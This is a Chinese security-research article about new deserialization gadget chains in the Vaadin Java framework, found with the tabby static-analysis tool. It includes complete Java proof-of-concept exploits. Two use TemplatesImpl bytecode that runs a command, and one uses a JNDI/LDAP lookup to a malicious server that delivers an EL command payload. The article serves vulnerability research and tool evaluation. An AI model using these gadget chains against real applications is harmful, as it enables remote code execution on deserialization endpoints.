# tabby在vaadin反序列化链寻找的应用-先知社区

> **来源**: https://xz.aliyun.com/news/17038  
> **文章ID**: 17038

---

## 前言

在学习前面几条链子的基础上，结合静态分析工具在前面的基础上的一些小发现，包括vaadin的新利用方式以及对tabby的检测缺陷的总结

## 任意方法调用

### com.vaadin.data.util.MethodProperty

如果分析过vaadin前面几条利用链，核心是寻找到了恶意的getValue使得能够触发方法调用或者JNDI攻击、JDBC attack等等

原始的Vaadin反序列化Gadget是通过利用`NestedMethodProperty#getValue`方法进行利用

这里同样可以使用`MethodProperty#getValue`进行替代使用，相比较而言，这个类的使用更方便

直接来看对应getValue方法的实现：

![image-20241225104430158.png](images/fd72adf4-4871-307e-a228-4cc2174ca78e)

非常的简洁，直接是若对应的`instance`属性不为空则反射调用`getMethod`属性中的方法

接下来看看`getMethod \ instance \ getArgs`这些属性值是否可控

这可太可控了，他们都是通过`MethodProperty`类的构造函数进行传入

![image-20241225104818113.png](images/284d7b8b-a630-3517-98a6-95c8a2a3d051)

该类存在有多个构造方法的重载形式：

![image-20241225105008005.png](images/524334cc-ce5e-333f-a4e8-b983caa0ff10)

对于第一个构造函数，仅仅接受两个参数，分别为`instance \ beanPropertyName`

![image-20241225105138466.png](images/9f2532ac-2083-3656-84bb-e234010fd0b1)

1. 获取传入的instance对象的类，以及处理传入的属性名，使得首字母大写
2. 通过`initGetterMethod`获取后续能够反射调用的Method方法![image-20241225105333998.png](images/3a424de6-72d4-3811-85df-341117891351)同之前的一样，能够调用getter / is / are方法

对于倒数第二个构造方法，需要传入7个参数：

![image-20241225110018291.png](images/3fcd7e5a-8230-3a9b-8bdd-5f7519f7004a)

1. 直接反射从传入的`instance`实例中获取该对象所有的方法列表
2. 后续使用我们传入的`getMethodName \ type`同反射获取的方法列表进行比对，若比对成功则直接将其赋值给`getMethod`属性
3. 通过上述分析，可以发现并未对传入的getMethodName变量做任何限制，我们这里不仅仅可以传入getter方法，同样可以传入非getter方法进行调用

而最后一个构造方法更极端，直接赋值：  
![image-20241225110602993.png](images/89d05870-f175-310a-b0e0-42f13c629420)

### POC

#### Way1

`MethodProperty`调用getter方法

```
package org.example.deser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.vaadin.data.util.MethodProperty;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Vaadin_test1 {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        TemplatesImpl templates=new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{getTemplates()});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates, "_tfactory", null);
        PropertysetItem pItem = new PropertysetItem();
        MethodProperty<Object> methodProperty = new MethodProperty<>(templates, "outputProperties");
        pItem.addItemProperty("test",methodProperty);
        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException("test");
        setFieldValue(badAttributeValueExpException,"val",pItem);
        String result=serialize(badAttributeValueExpException);
        unserialize(result);


    }

    public static String serialize(Object object) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static void unserialize(String base) throws IOException, ClassNotFoundException {
        byte[] result=Base64.getDecoder().decode(base);
        ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(result);
        ObjectInputStream objectInputStream=new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {
        ClassPool classPool=ClassPool.getDefault();
        CtClass ctClass=classPool.makeClass("test");
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec("calc");";
        ctClass.makeClassInitializer().insertBefore(block);
        return ctClass.toBytecode();
    }
    public static void setFieldValue(Object object,String field,Object arg) throws NoSuchFieldException, IllegalAccessException {
        Field f=object.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(object,arg);
    }
}
```

#### Way2

`MethodProperty`调用任意方法

```
package org.example.deser;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.vaadin.data.util.MethodProperty;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Properties;

public class Vaadin_test1 {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException {
        TemplatesImpl templates=new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{getTemplates()});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates, "_tfactory", null);
        PropertysetItem pItem = new PropertysetItem();
        // way1
//        MethodProperty<Object> methodProperty = new MethodProperty<>(templates, "outputProperties");
        // way2
        Method getOutputProperties = templates.getClass().getDeclaredMethod("getOutputProperties");
        MethodProperty methodProperty = new MethodProperty<>(Properties.class, templates, getOutputProperties, null,  new Object[0],  new Object[0], -1);
        pItem.addItemProperty("test",methodProperty);
        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException("test");
        setFieldValue(badAttributeValueExpException,"val",pItem);
        String result=serialize(badAttributeValueExpException);
        unserialize(result);


    }

    public static String serialize(Object object) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

    public static void unserialize(String base) throws IOException, ClassNotFoundException {
        byte[] result=Base64.getDecoder().decode(base);
        ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(result);
        ObjectInputStream objectInputStream=new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {
        ClassPool classPool=ClassPool.getDefault();
        CtClass ctClass=classPool.makeClass("test");
        ctClass.setSuperclass(classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec("calc");";
        ctClass.makeClassInitializer().insertBefore(block);
        return ctClass.toBytecode();
    }
    public static void setFieldValue(Object object,String field,Object arg) throws NoSuchFieldException, IllegalAccessException {
        Field f=object.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(object,arg);
    }
}
```

## FileInputStream参数可控

### com.vaadin.data.util.TextFileProperty

同样是在其getValue方法中：

![image-20241225113257663.png](images/af451034-337b-3e8e-88ef-13558ea90bc7)

直接传入了file属性，且该属性值可控，在读取文件之后将内容进行返回

> 有点子疑惑，在反序列化漏洞的场景下这种可以读文件吗？不是很懂....

## JDBC attack

[Vaadin New Gadgets分享 - 先知社区](https://xz.aliyun.com/t/15715?time__1311=GqjxnQiQoQuDlxGgpDy07G8YOKY5qqDObAeD#toc-0)

师傅在前面提到了一个链子

`J2EEConnectionPool#reserveConnection`的利用

![image-20241225113956971.png](images/e6a73982-5c3b-3dbd-ad1a-f92986f50519)

主要是考虑到了`reserveConnection -> getDataSource -> lookupDataSource`这样的流程触发了JNDI注入

同样的，在这里如果这里的`dataSource`属性值不为空，则会调用`DataSource#getConnection`触发JDBC attack

### POC

`J2EEConnectionPool#reserveConnection`的JDBC attack:

```
package org.example.deser;

import com.vaadin.data.util.PropertysetItem;
import com.vaadin.data.util.sqlcontainer.RowId;
import com.vaadin.data.util.sqlcontainer.SQLContainer;
import com.vaadin.data.util.sqlcontainer.connection.J2EEConnectionPool;
import com.vaadin.data.util.sqlcontainer.query.TableQuery;
import com.vaadin.data.util.sqlcontainer.query.generator.DefaultSQLGenerator;
import com.vaadin.ui.NativeSelect;
import org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource;
import org.example.utils.ReflectionUtil;
import org.example.utils.Serializer;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;

public class Vaadin1_v1 {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, IOException {
        String command = "ldap://127.0.0.1:1389/TomcatEL/Command/calc";
        SharedPoolDataSource dataSource = new SharedPoolDataSource();
        dataSource.setDataSourceName(command);
        J2EEConnectionPool j2EEConnectionPool = new J2EEConnectionPool(dataSource);

        TableQuery tableQuery = (TableQuery) ReflectionUtil.createWithoutConstructor("com.vaadin.data.util.sqlcontainer.query.TableQuery");
        // prevent the error
        ReflectionUtil.setFieldValue(tableQuery, "primaryKeyColumns", new ArrayList<>());
        ReflectionUtil.setFieldValue(tableQuery, "sqlGenerator", new DefaultSQLGenerator());
        ReflectionUtil.setFieldValue(tableQuery, "connectionPool", j2EEConnectionPool);

        Constructor<SQLContainer> sqlContainerConstructor = SQLContainer.class.getDeclaredConstructor();
        sqlContainerConstructor.setAccessible(true);
        SQLContainer sqlContainer = sqlContainerConstructor.newInstance();
        ReflectionUtil.setFieldValue(sqlContainer, "queryDelegate", tableQuery);

        NativeSelect nativeSelect = new NativeSelect();
        RowId rowId = new RowId();
        ReflectionUtil.setFieldValue(nativeSelect, "value", rowId);
        ReflectionUtil.setFieldValue(nativeSelect, "items", sqlContainer);
        ReflectionUtil.setFieldValue(nativeSelect, "multiSelect", true);

        PropertysetItem propertysetItem = new PropertysetItem();
        propertysetItem.addItemProperty("test", nativeSelect);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("test");
        ReflectionUtil.setFieldValue(badAttributeValueExpException, "val", propertysetItem);

        byte[] bytes = Serializer.serialize(badAttributeValueExpException);
        Serializer.deserialize(bytes);
    }
}
```

上面使用了dbcp依赖，打EL表达式，需要添加对应的依赖

## 总结

起始时使用污点分析工具进行利用链的查找，虽然可以找到原始的利用链的完整通路，但是对于https://xz.aliyun.com/t/15715这篇文章提到的两条链子并不存在有通路，通过分析，该俩链子在最后达到sink点，也即是JNDI触发位置时，并没有参数被污染，数据流不能够被传递

例如`J2EEConnectionPool#reserveConnection`以及`SimpleJDBCConnectionPool#reserveConnection`方法

![image-20241225215645209.png](images/1db90286-c9c3-348d-a653-4a7931dc1033)

![image-20241225215734519.png](images/422d49ef-7bba-37b4-a994-0d03362bb7fb)

同时，在使用tabby的过程中，发现虽然能够使用`apoc.algo.allSimplePaths`这一个procedure查到对应的两条链子，但是并不能够检索到`J2EEConnectionPool#reserveConnection`中存在的JDBC attack

![image-20241225220203992.png](images/446185fa-06fe-3a24-9a3e-005c5d02279b)

究其原因，可能是在生成调用关系图的过程中，并没有处理这类连续调用的情况：`getDataSource().getConnection()`，算是一个小缺陷...

## 参考

<https://xz.aliyun.com/t/15715>

<https://xz.aliyun.com/t/16627>
